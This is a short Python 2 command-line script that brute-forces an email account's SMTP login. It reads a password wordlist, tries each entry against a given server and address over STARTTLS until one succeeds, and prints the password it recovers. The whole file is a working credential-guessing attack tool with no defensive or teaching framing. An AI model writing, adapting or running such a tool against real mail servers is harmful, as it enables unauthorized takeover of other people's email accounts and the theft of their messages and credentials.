#!/usr/bin/env python
#-*-coding:UTF-8-*-

try:
	import argparse, os, smtplib
	from sys import exit
	from threading import Thread
except ImportError as err:
	print "An error as occured:", err

class Process(Thread):
	def __init__(self, smtp, port, email, dictionnary):
		Thread.__init__(self)
		self.smtp = smtp
		self.port = port
		self.email = email
		self.dictionnary = dictionnary
		self.flag = False
		self.count = 0

	def run(self):
		while not self.flag:
			try:
				server = smtplib.SMTP(self.smtp, self.port)
				server.starttls()
				server.login(self.email, self.dictionnary[self.count].rstrip("\n"))
				server.quit()
				self.flag = True
			except smtplib.SMTPAuthenticationError:
				self.count += 1
			except smtplib.SMTPException as err:
                                print "An error as occured:", err
                                exit(2)
			except IndexError:
				print "> Password not found."
				exit(2)

		if self.flag: print "> Password:", self.dictionnary[self.count].rstrip("\n")
		else: print "> Password not found."

def main():
	parser = argparse.ArgumentParser(description="")
	
	parser.add_argument("Smtp",
			type=str,
			action="store",
			metavar="Smtp",
			help="SMTP server name.")

	parser.add_argument("Port", 
                        type=int,
                        action="store", 
                        metavar="Port", 
                        help="SMTP port.")

	parser.add_argument("Email", 
                        type=str,
                        action="store", 
                        metavar="Email", 
                        help="Email address.")

	parser.add_argument("FilePath",
                        type=str,
                        action="store",
                        metavar="FilePath",
                        help="FilePath dictionnary.")
	
	args = parser.parse_args()

	if os.name == "nt": os.system("cls")
	elif os.name == "posix": os.system("clear")

	try:
		with open(args.FilePath, "r") as f:
			dictionnary = f.readlines()
		
		print "> Account locked:", args.Email
		process = Process(args.Smtp, args.Port, args.Email, dictionnary)
		process.start()
	except IOError as err:
                print "An error as occured:", err
main()
